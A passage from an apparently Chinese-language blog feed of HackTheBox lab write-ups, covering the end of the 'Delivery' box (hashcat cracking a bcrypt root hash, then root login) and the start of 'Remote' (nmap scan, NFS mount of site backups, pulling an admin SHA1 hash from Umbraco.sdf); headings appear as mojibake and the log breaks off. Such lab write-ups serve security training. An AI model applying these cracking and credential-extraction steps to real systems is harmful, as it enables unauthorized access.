Encryption (FDE)</span><br><span class="line">  13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)</span><br><span class="line">  13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span><br><span class="line">  20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)</span><br><span class="line">  20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  22100 | BitLocker                                        | Full-Disk Encryption (FDE)</span><br><span class="line">  12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span><br><span class="line">   8800 | Android FDE &lt;= 4.3                               | Full-Disk Encryption (FDE)</span><br><span class="line">  18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span><br><span class="line">   6211 | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6221 | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">   6222 | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6223 | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6231 | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6232 | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6233 | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  22700 | MultiBit HD (scrypt)                             | Password Managers</span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;bcrypt&quot;</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 1408/1472 MB (512 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 72</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 65 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: word.list</span><br><span class="line">* Passwords.: 77</span><br><span class="line">* Bytes.....: 1177</span><br><span class="line">* Keyspace..: 77</span><br><span class="line">* Runtime...: 0 secs</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: bcrypt $2*$, Blowfish (Unix)</span><br><span class="line">Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO</span><br><span class="line">Time.Started.....: Wed Feb  3 19:25:48 2021 (1 sec)</span><br><span class="line">Time.Estimated...: Wed Feb  3 19:25:49 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (word.list)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:       28 H/s (7.82ms) @ Accel:4 Loops:32 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 32/77 (41.56%)</span><br><span class="line">Rejected.........: 0/32 (0.00%)</span><br><span class="line">Restore.Point....: 16/77 (20.78%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br><span class="line">Candidates.#1....: PleaseSubscribe!02 -&gt; PleaseSubscribs</span><br><span class="line"></span><br><span class="line">Started: Wed Feb  3 19:25:09 2021</span><br><span class="line">Stopped: Wed Feb  3 19:25:50 2021</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list --show</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure>

<p><code>å¾—åˆ°å¯†ç PleaseSubscribe!21</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Delivery:/home/maildeliverer# whoami</span><br><span class="line">root</span><br><span class="line">root@Delivery:/# cd ~</span><br><span class="line">root@Delivery:~# ls</span><br><span class="line">mail.sh  note.txt  py-smtp.py  root.txt</span><br><span class="line">root@Delivery:~# cat root.txt </span><br><span class="line">***************************</span><br><span class="line">root@Delivery:~#</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2ludGlncml0aS9ob3ctaS1oYWNrZWQtaHVuZHJlZHMtb2YtY29tcGFuaWVzLXRocm91Z2gtdGhlaXItaGVscGRlc2stYjc2ODBkZGMyZDRj">å¤§ä½¬çš„çµæ„Ÿrespect<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[remote]</title>
    <url>/2020/08/31/HTB-remote/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/08/31/HTB-remote/image-20200905171855936.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä¸»è¦ä¿¡æ¯21/80ç«¯å£ï¼ŒnfsæœåŠ¡ä¸mountd</code></p>
<blockquote>
<p>NFSï¼ˆNetwork File Systemï¼‰å³ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œæ˜¯FreeBSDæ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ç§ï¼Œå®ƒå…è®¸ç½‘ç»œä¸­çš„è®¡ç®—æœºä¹‹é—´å…±äº«èµ„æºã€‚åœ¨NFSçš„åº”ç”¨ä¸­ï¼Œæœ¬åœ°NFSçš„å®¢æˆ·ç«¯åº”ç”¨å¯ä»¥é€æ˜åœ°è¯»å†™ä½äºè¿œç«¯NFSæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå°±åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># nmap -sC -sV 10.10.10.180 -oN nmap.CV</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:09 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.180</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Home - Acme Widgets</span><br><span class="line">111/tcp  open  rpcbind       2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">2049/tcp open  mountd        1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m52s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-08-31T10:12:50</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.17 seconds</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-è®¿é—®ftp"><a href="#0x02-è®¿é—®ftp" class="headerlink" title="0x02.è®¿é—®ftp"></a>0x02.è®¿é—®ftp</h2><p><code>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</code></p>
<img src="/2020/08/31/HTB-remote/image-20200831190220563.png" class>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><img src="/2020/08/31/HTB-remote/image-20200831191217565.png" class>

<p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°umbracoç™»å…¥æ¡†</code></p>
<blockquote>
<p>umbracoä¸ºä»˜è´¹cms</p>
</blockquote>
<img src="/2020/08/31/HTB-remote/image-20200831191429524.png" class>

<h2 id="0x04-æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯"><a href="#0x04-æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯" class="headerlink" title="0x04.æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯"></a>0x04.æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯</h2><p><code>æŸ¥çœ‹æŒ‚è½½ç›®å½•ï¼Œå‘ç°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œæƒé™ä¸ºeveryone</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># showmount -e 10.10.10.180</span></span><br><span class="line">Export list <span class="keyword">for</span> 10.10.10.180:</span><br><span class="line">/site_backups (everyone)</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>æŒ‚è½½åˆ°æœ¬åœ°ï¼Œè¿›è¡ŒæŸ¥çœ‹</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># mkdir site_backups</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># mount 10.10.10.180:site_backups site_backups/</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># cd site_backups/</span></span><br><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment"># ls</span></span><br><span class="line">App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config</span><br><span class="line">App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views</span><br><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹Umbraco.sdfæ•°æ®åº“ä¸­adminå­—ç¬¦</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment"># cd App_Data/</span></span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment"># ls</span></span><br><span class="line">cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf  </span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment"># strings Umbraco.sdf | grep admin</span></span><br><span class="line">Administratoradmindefaulten-US</span><br><span class="line">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d</span><br><span class="line">Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating SessionTimeout, SecurityStamp, CreateDate, UpdateDate, Id, HasIdentity</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, IsApproved, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Name, Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Username, Email, Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1umbraco/user/sign-in/failedlogin failed</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">adminAdministratorsCADMOSKTPIURZ:5F7</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating TourData, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span 